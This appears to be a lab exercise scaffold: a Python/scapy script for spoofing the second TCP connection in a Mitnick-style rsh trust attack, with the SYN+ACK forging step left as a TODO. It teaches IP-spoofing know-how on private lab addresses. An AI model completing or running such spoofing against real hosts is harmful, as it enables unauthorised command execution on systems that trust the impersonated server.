#!/usr/bin/env python3
"""
Mitnick Attack - spoof the SECOND TCP connection. After the first
connection's rsh data is accepted, X-Terminal opens a new connection BACK
to the Trusted Server on the port you named (CONN2_PORT in
conn1_spoof.py) -- rshd uses it for error output, and refuses to run your
command at all unless this second connection also completes.

Start this script BEFORE conn1_spoof.py -- it needs to already be
listening when X-Terminal's SYN for this connection arrives.

Same restriction as conn1_spoof.py: only use the TCP sequence number,
flags, and length fields from sniffed packets. Never the ack field.
"""
from scapy.all import IP, TCP, sniff, send

IFACE = "br-????????????"          # TODO: same bridge interface as conn1_spoof.py

X_IP = "10.9.0.5"                   # X-Terminal -- initiates this connection
SRV_IP = "10.9.0.6"                 # Trusted Server -- we're impersonating this side
CONN2_PORT = 9090                   # must match conn1_spoof.py's rsh data payload

my_synack_seq = 0x2000  # the ISN *we* choose for our spoofed SYN+ACK


def spoof(pkt):
    ip, tcp = pkt[IP], pkt[TCP]
    tcp_len = ip.len - ip.ihl * 4 - tcp.dataofs * 4
    print(f"{ip.src}:{tcp.sport} -> {ip.dst}:{tcp.dport} "
          f"flags={tcp.flags} len={tcp_len}")

    if tcp.flags == "S" and ip.src == X_IP and tcp.dport == CONN2_PORT:
        # TODO: X-Terminal just sent a SYN to open the second connection.
        # Spoof the matching SYN+ACK as if you were the Trusted Server:
        #   src=SRV_IP, dst=X_IP, sport=CONN2_PORT, dport=tcp.sport,
        #   flags="SA", seq=my_synack_seq, ack=<X-Terminal's seq> + 1
        # (again: only tcp.seq, never tcp.ack)
        pass  # <-- replace with your SYN+ACK code


def run():
    sniff(iface=IFACE, filter=f"tcp and host {X_IP} and port {CONN2_PORT}", prn=spoof)


if __name__ == "__main__":
    run()
